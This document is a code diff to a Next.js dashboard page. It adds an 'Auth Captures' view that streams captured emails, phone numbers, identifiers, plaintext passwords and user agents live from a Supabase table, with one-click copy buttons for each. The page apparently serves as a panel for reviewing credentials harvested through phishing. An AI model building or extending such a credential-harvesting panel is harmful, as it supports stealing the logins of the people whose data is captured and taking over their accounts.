@@ -1,5 +1,6 @@
-import React, { useEffect, useState, useCallback } from "react";
+import React, { useEffect, useState, useCallback, useRef } from "react";
 import Head from "next/head";
+import { getSupabaseClient } from "../lib/supabase";
 
 type UserInfo = {
   uid: string;
@@ -30,6 +31,18 @@ type DataRecord = {
   createdAt: string;
 };
 
+type AuthCapture = {
+  id: string;
+  type: string | null;
+  method: string | null;
+  email: string | null;
+  phone: string | null;
+  identifier: string | null;
+  password: string | null;
+  user_agent: string | null;
+  created_at: string;
+};
+
 export default function Home() {
   const [loading, setLoading] = useState(true);
   const [user, setUser] = useState<UserInfo | null>(null);
@@ -42,7 +55,9 @@ export default function Home() {
   const [submitting, setSubmitting] = useState(false);
 
   // Admin state
-  const [adminTab, setAdminTab] = useState<"users" | "sessions" | "records">("users");
+  const [adminTab, setAdminTab] = useState<"users" | "sessions" | "captures" | "records">("users");
+  const [userTab, setUserTab] = useState<"captures" | "records">("captures");
+  const [captures, setCaptures] = useState<AuthCapture[]>([]);
   const [usersList, setUsersList] = useState<ManagedUser[]>([]);
   const [sessionsList, setSessionsList] = useState<ActiveSession[]>([]);
   const [newUid, setNewUid] = useState("");
@@ -64,6 +79,7 @@ export default function Home() {
   const [showFilters, setShowFilters] = useState(true);
   const [copiedId, setCopiedId] = useState<string | null>(null);
   const [openNoteId, setOpenNoteId] = useState<number | null>(null);
+  const [liveStatus, setLiveStatus] = useState<"connecting" | "live" | "syncing">("connecting");
 
   const handleForcedLogout = useCallback((msg?: string) => {
     setUser(null);
@@ -124,7 +140,7 @@ export default function Home() {
     if (searchField !== "all") params.set("field", searchField);
     if (ratingFilter !== null) params.set("rating", String(ratingFilter));
 
-    const res = await fetch(`/api/records?${params.toString()}`);
+    const res = await fetch(`/api/records?${params.toString()}`, { cache: "no-store" });
     if (res.status === 401) {
       const data = await res.json();
       handleForcedLogout(data.error);
@@ -132,9 +148,40 @@ export default function Home() {
     }
     if (res.ok) {
       const data = await res.json();
-      setRecords(data.records || []);
+      const sorted = [...(data.records || [])].sort((a: DataRecord, b: DataRecord) => {
+        const timeDiff = new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime();
+        return timeDiff !== 0 ? timeDiff : b.id - a.id;
+      });
+      setRecords(sorted);
     }
   }, [user, searchQ, searchField, ratingFilter, handleForcedLogout]);
+
+  const fetchCaptures = useCallback(async () => {
+    if (!user) return;
+    const params = new URLSearchParams();
+    if (searchQ.trim()) params.set("q", searchQ.trim());
+    if (searchField !== "all") params.set("field", searchField);
+
+    const res = await fetch(`/api/captures?${params.toString()}`, { cache: "no-store" });
+    if (res.status === 401) {
+      const data = await res.json();
+      handleForcedLogout(data.error);
+      return;
+    }
+    if (res.ok) {
+      const data = await res.json();
+      const sorted = [...(data.captures || [])].sort(
+        (a: AuthCapture, b: AuthCapture) =>
+          new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
+      );
+      setCaptures(sorted);
+    }
+  }, [user, searchQ, searchField, handleForcedLogout]);
+
+  const refreshAllData = useCallback(() => {
+    fetchRecords();
+    fetchCaptures();
+  }, [fetchRecords, fetchCaptures]);
 
   const fetchAdminData = useCallback(async () => {
     if (!user || user.role !== "admin") return;
@@ -149,15 +196,84 @@ export default function Home() {
     }
   }, [user]);
 
+  const fetchAllRef = useRef(refreshAllData);
+  useEffect(() => {
+    fetchAllRef.current = refreshAllData;
+  }, [refreshAllData]);
+
   useEffect(() => {
     if (!user) return;
     if (user.role === "admin") {
       fetchAdminData();
-      fetchRecords();
+      refreshAllData();
     } else {
-      fetchRecords();
+      refreshAllData();
     }
-  }, [user, fetchAdminData, fetchRecords]);
+  }, [user, fetchAdminData, refreshAllData]);
+
+  // Live Supabase Realtime connection + visibility/fallback sync so user always sees updated data
+  useEffect(() => {
+    if (!user) return;
+
+    const supabase = getSupabaseClient();
+    let channel: ReturnType<NonNullable<typeof supabase>["channel"]> | null = null;
+    let isRealtimeSubscribed = false;
+
+    if (supabase) {
+      setLiveStatus("connecting");
+      channel = supabase
+        .channel("datarecord-live")
+        .on(
+          "postgres_changes",
+          { event: "*", schema: "public", table: "DataRecord" },
+          () => {
+            fetchAllRef.current();
+          }
+        )
+        .on(
+          "postgres_changes",
+          { event: "*", schema: "public", table: "auth_captures" },
+          () => {
+            fetchAllRef.current();
+          }
+        )
+        .subscribe((status) => {
+          if (status === "SUBSCRIBED") {
+            isRealtimeSubscribed = true;
+            setLiveStatus("live");
+          } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
+            isRealtimeSubscribed = false;
+            setLiveStatus("syncing");
+          }
+        });
+    } else {
+      setLiveStatus("syncing");
+    }
+
+    const handleFocusOrVisible = () => {
+      if (document.visibilityState === "visible") {
+        fetchAllRef.current();
+      }
+    };
+    window.addEventListener("focus", handleFocusOrVisible);
+    document.addEventListener("visibilitychange", handleFocusOrVisible);
+
+    // Fallback sync every 5s when Realtime is not subscribed
+    const fallbackTimer = setInterval(() => {
+      if (!isRealtimeSubscribed) {
+        fetchAllRef.current();
+      }
+    }, 5000);
+
+    return () => {
+      window.removeEventListener("focus", handleFocusOrVisible);
+      document.removeEventListener("visibilitychange", handleFocusOrVisible);
+      clearInterval(fallbackTimer);
+      if (supabase && channel) {
+        supabase.removeChannel(channel);
+      }
+    };
+  }, [user]);
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -198,6 +314,7 @@ export default function Home() {
     await fetch("/api/auth/logout", { method: "POST" });
     setUser(null);
     setRecords([]);
+    setCaptures([]);
     setNotice(null);
   };
 
@@ -294,6 +411,74 @@ export default function Home() {
     }) + ", " + d.toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
   };
 
+  const renderCaptureCards = () => (
+    <div style={styles.cardGrid}>
+      {captures.length === 0 ? (
+        <div style={{ color: "#9ca3af", padding: "2rem 0" }}>No auth captures found.</div>
+      ) : (
+        captures.map((cap) => (
+          <div key={cap.id} style={styles.dataCard}>
+            <div style={styles.cardLine}>
+              <span style={cap.email || cap.identifier ? styles.cardTitle : styles.cardMuted}>
+                {cap.email || cap.identifier || "No email / identifier"}
+              </span>
+              <button
+                onClick={() => copyValue(`cap-e-${cap.id}`, cap.email || cap.identifier)}
+                style={styles.copyBtn}
+                title="Copy email/identifier"
+              >
+                {copiedId === `cap-e-${cap.id}` ? "✓" : "❐"}
+              </button>
+            </div>
+
+            <div style={styles.cardLine}>
+              <span style={cap.phone ? styles.cardText : styles.cardMuted}>
+                {cap.phone || "No phone"}
+              </span>
+              <button
+                onClick={() => copyValue(`cap-p-${cap.id}`, cap.phone)}
+                style={styles.copyBtn}
+                title="Copy phone"
+              >
+                {copiedId === `cap-p-${cap.id}` ? "✓" : "❐"}
+              </button>
+            </div>
+
+            <div style={styles.cardLine}>
+              <span style={styles.cardText}>
+                <span style={{ color: "#9ca3af" }}>password: </span>
+                {cap.password || "—"}
+              </span>
+              <button
+                onClick={() => copyValue(`cap-pw-${cap.id}`, cap.password)}
+                style={styles.copyBtn}
+                title="Copy password"
+              >
+                {copiedId === `cap-pw-${cap.id}` ? "✓" : "❐"}
+              </button>
+            </div>
+
+            <div style={styles.cardMetaRow}>
+              <span style={styles.rolePill}>
+                {cap.type || "capture"}
+                {cap.method ? ` · ${cap.method}` : ""}
+              </span>
+              <span style={{ color: "#9ca3af", fontSize: 11 }}>
+                {cap.created_at ? formatDate(cap.created_at) : ""}
+              </span>
+            </div>
+
+            {cap.user_agent && (
+              <div style={{ color: "#9ca3af", fontSize: 11, marginTop: 6, wordBreak: "break-word" }}>
+                {cap.user_agent}
+              </div>
+            )}
+          </div>
+        ))
+      )}
+    </div>
+  );
+
   if (loading) {
     return (
       <div style={styles.centerWrap}>
@@ -369,6 +554,15 @@ export default function Home() {
               <span style={styles.adminPill}>Admin</span>
             </div>
             <div style={styles.topbarRight}>
+              <span
+                style={liveStatus === "live" ? styles.livePill : styles.syncPill}
+                title={liveStatus === "live" ? "Connected to Supabase Realtime" : "Auto-syncing with database"}
+              >
+                {liveStatus === "live" ? "● Live" : "○ Sync"}
+              </span>
+              <button onClick={refreshAllData} style={styles.refreshBtn} title="Refresh data now">
+                ↻
+              </button>
               <span style={styles.userBadge}>{user.uid}</span>
               <button onClick={handleLogout} style={styles.logoutBtn} title="Logout">
                 Logout
@@ -391,6 +585,12 @@ export default function Home() {
                 style={adminTab === "sessions" ? styles.tabActive : styles.tabBtn}
               >
                 Sessions ({sessionsList.length})
+              </button>
+              <button
+                onClick={() => setAdminTab("captures")}
+                style={adminTab === "captures" ? styles.tabActive : styles.tabBtn}
+              >
+                Auth Captures ({captures.length})
               </button>
               <button
                 onClick={() => setAdminTab("records")}
@@ -474,6 +674,13 @@ export default function Home() {
               </section>
             )}
 
+            {adminTab === "captures" && (
+              <section style={styles.panelBox}>
+                <h2 style={styles.sectionTitle}>Live Auth Captures ({captures.length})</h2>
+                {renderCaptureCards()}
+              </section>
+            )}
+
             {adminTab === "records" && (
               <section style={styles.panelBox}>
                 <h2 style={styles.sectionTitle}>Add Data Record</h2>
@@ -549,6 +756,15 @@ export default function Home() {
             </button>
           </div>
           <div style={styles.topbarRight}>
+            <span
+              style={liveStatus === "live" ? styles.livePill : styles.syncPill}
+              title={liveStatus === "live" ? "Connected to Supabase Realtime" : "Auto-syncing with database"}
+            >
+              {liveStatus === "live" ? "● Live" : "○ Sync"}
+            </span>
+            <button onClick={refreshAllData} style={styles.refreshBtn} title="Refresh data now">
+              ↻
+            </button>
             <span style={styles.userBadge}>{user.uid}</span>
             <button onClick={handleLogout} style={styles.logoutBtn} title="Logout">
               Logout
@@ -558,6 +774,21 @@ export default function Home() {
 
         <main style={styles.main}>
           {notice && <div style={styles.noticeBanner}>{notice}</div>}
+
+          <div style={styles.tabsRow}>
+            <button
+              onClick={() => setUserTab("captures")}
+              style={userTab === "captures" ? styles.tabActive : styles.tabBtn}
+            >
+              Auth Captures ({captures.length})
+            </button>
+            <button
+              onClick={() => setUserTab("records")}
+              style={userTab === "records" ? styles.tabActive : styles.tabBtn}
+            >
+              Data Records ({records.length})
+            </button>
+          </div>
 
           {showFilters && (
             <div style={styles.searchBarRow}>
@@ -606,7 +837,10 @@ export default function Home() {
             </div>
           )}
 
-          <div style={styles.cardGrid}>
+          {userTab === "captures" ? (
+            renderCaptureCards()
+          ) : (
+            <div style={styles.cardGrid}>
             {records.length === 0 ? (
               <div style={{ color: "#9ca3af", padding: "2rem 0" }}>No matching records found.</div>
             ) : (
@@ -684,6 +918,7 @@ export default function Home() {
               ))
             )}
           </div>
+          )}
         </main>
       </div>
     </>
@@ -853,6 +1088,33 @@ const styles: Record<string, React.CSSProperties> = {
     borderRadius: 6,
     fontSize: 12,
     fontWeight: 600,
+  },
+  livePill: {
+    backgroundColor: "#143326",
+    color: "#4ade80",
+    border: "1px solid #166534",
+    padding: "4px 8px",
+    borderRadius: 6,
+    fontSize: 11,
+    fontWeight: 600,
+  },
+  syncPill: {
+    backgroundColor: "#2c2520",
+    color: "#fbbf24",
+    border: "1px solid #854d0e",
+    padding: "4px 8px",
+    borderRadius: 6,
+    fontSize: 11,
+    fontWeight: 600,
+  },
+  refreshBtn: {
+    backgroundColor: "#2d303e",
+    color: "#e4e4ec",
+    border: "1px solid #353746",
+    borderRadius: 6,
+    padding: "4px 8px",
+    fontSize: 13,
+    cursor: "pointer",
   },
   logoutBtn: {
     backgroundColor: "#e4e4ec",
